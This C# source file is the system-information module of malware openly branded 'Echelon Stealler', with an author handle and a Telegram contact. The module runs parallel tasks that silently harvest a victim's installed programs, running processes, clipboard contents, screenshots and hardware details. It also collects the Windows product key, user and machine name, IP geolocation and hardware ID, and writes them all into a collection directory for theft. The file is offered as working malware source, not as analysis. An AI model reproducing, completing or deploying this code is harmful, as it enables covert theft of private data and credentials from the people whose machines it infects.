﻿///////////////////////////////////////////////////////
////Echelon Stealler, C# Malware Systems by MadСod ////
///////////////////Telegram: @madcod///////////////////
///////////////////////////////////////////////////////

using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml;

namespace Echelon
{
    class Systemsinfo
    {
        public static string information = Help.collectionDir + "\\System_Information.txt";

        [STAThread]
        public static void GetSystemsData(string collectionDir)
        {

            try
            {
                Task[] t01 = new Task[1] { new Task(() => GetSystem(collectionDir)), };
                Task[] t02 = new Task[1] { new Task(() => GetProg(collectionDir)), };
                Task[] t03 = new Task[1] { new Task(() => GetProc(collectionDir)), };
                Task[] t04 = new Task[1] { new Task(() => BuffBoard.GetClipboard(collectionDir)), };
                Task[] t05 = new Task[1] { new Task(() => Screenshot.GetScreenShot(collectionDir)), };

                new Thread(() => { foreach (var t in t01) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t02) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t03) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t04) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t05) t.Start(); }).Start();


                Task.WaitAll(t01);
                Task.WaitAll(t02);
                Task.WaitAll(t03);
                Task.WaitAll(t04);
                Task.WaitAll(t05);
            }
            catch { }
        }

        public static void GetProg(string Echelon_Dir)
        {
            using (StreamWriter programmestext = new StreamWriter(Echelon_Dir + "\\Programms.txt", false, Encoding.Default))
            {
                try
                {
                    string displayName;
                    RegistryKey key;
                    key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall");
                    string[] keys = key.GetSubKeyNames();
                    for (int i = 0; i < keys.Length; i++)
                    {
                        RegistryKey subkey = key.OpenSubKey(keys[i]);
                        displayName = subkey.GetValue("DisplayName") as string;
                        if (displayName == null) continue;
                        programmestext.WriteLine(displayName);
                    }
                }
                catch
                {
                }
            }
        }

        public static void GetProc(string Echelon_Dir)
        {
            try
            {
                using (StreamWriter processest = new StreamWriter(Echelon_Dir + "\\Processes.txt", false, Encoding.Default))
                {
                    Process[] processes = Process.GetProcesses();
                    for (int i = 0; i < processes.Length; i++)
                    {
                        processest.WriteLine(processes[i].ProcessName.ToString());
                    }
                }
            }
            catch
            {
            }
        }

        public static string GetGpuName()
        {
            try
            {
                string gpuName = string.Empty;
                string query = "SELECT * FROM Win32_VideoController";
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                { foreach (ManagementObject mObject in searcher.Get()) { gpuName += mObject["Description"].ToString() + " "; } }
                return (!string.IsNullOrEmpty(gpuName)) ? gpuName : "N/A";
            }
            catch { return "Unknown"; }
        }

        public static string GetPhysicalMemory() // Получаем кол-во RAM Памяти в мб
        {
            try
            {
                ManagementScope scope = new ManagementScope();
                ObjectQuery query = new ObjectQuery("SELECT Capacity FROM Win32_PhysicalMemory");
                ManagementObjectCollection managementObjectCollection = new ManagementObjectSearcher(scope, query).Get();
                long num = 0L;
                foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
                {
                    long num2 = Convert.ToInt64(((ManagementObject)managementBaseObject)["Capacity"]);
                    num += num2;
                }
                num = num / 1024L / 1024L;
                return num.ToString();
            }
            catch { return "Unknown"; }
        }

        public static string GetOSInformation() //Получаем инфу об ОС
        {
            foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem").Get())
            {
                ManagementObject managementObject = (ManagementObject)managementBaseObject;
                try
                {
                    return string.Concat(new string[]
                    {
                    ((string)managementObject["Caption"]).Trim(),
                    ", ",
                    (string)managementObject["Version"],
                    ", ",
                    (string)managementObject["OSArchitecture"]
                    });
                }
                catch
                {
                }
            }
            return "BIOS Maker: Unknown";
        }


        public static string GetComputerName() // Получаем имя ПК
        {
            try
            {
                ManagementObjectCollection instances = new ManagementClass("Win32_ComputerSystem").GetInstances();
                string result = string.Empty;
                foreach (ManagementBaseObject managementBaseObject in instances)
                {
                    result = (string)((ManagementObject)managementBaseObject)["Name"];
                }
                return result;
            }
            catch { return "Unknown"; }

        }

        public static string GetProcessorName() // Получаем название процессора
        {
            try
            {
                ManagementObjectCollection instances = new ManagementClass("Win32_Processor").GetInstances();
                string result = string.Empty;
                foreach (ManagementBaseObject managementBaseObject in instances)
                {
                    result = (string)((ManagementObject)managementBaseObject)["Name"];
                }
                return result;
            }
            catch { return "Unknown"; }
        }

        public static void GetSystem(string Echelon_Dir)
        {

            ComputerInfo pc = new ComputerInfo();

            //Системное инфо

            Size resolution = Screen.PrimaryScreen.Bounds.Size; //getting resolution

            try
            {
                using (StreamWriter langtext = new StreamWriter(information, false, Encoding.Default))
                {

                    langtext.WriteLine("==================================================" +
                        "\n Operating system: " + Environment.OSVersion + " | " + pc.OSFullName +
                        "\n PC user: " + Environment.MachineName + "/" + Environment.UserName +
                        "\n WinKey: " + WinKey.GetWindowsKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "DigitalProductId") + 
                        "\n==================================================" +
                        "\n Screen resolution: " + resolution +
                        "\n Current time Utc: " + DateTime.UtcNow +
                        "\n Current time: " + DateTime.Now +
                        "\n==================================================" +
                        "\n CPU: " + GetProcessorName() +
                        "\n RAM: " + GetPhysicalMemory() +
                        "\n GPU: " + GetGpuName() +
                        "\n ==================================================" +
                        "\n IP Geolocation: " + Help.IP + " " + Help.Country() +
                        "\n Log Date: " + Help.date +
                        "\n Version build: " + Program.buildversion +
                        "\n HWID: " + Help.HWID 


                        );

                    langtext.Close();

                }
            }
            catch
            {

            }
        }
    }
}
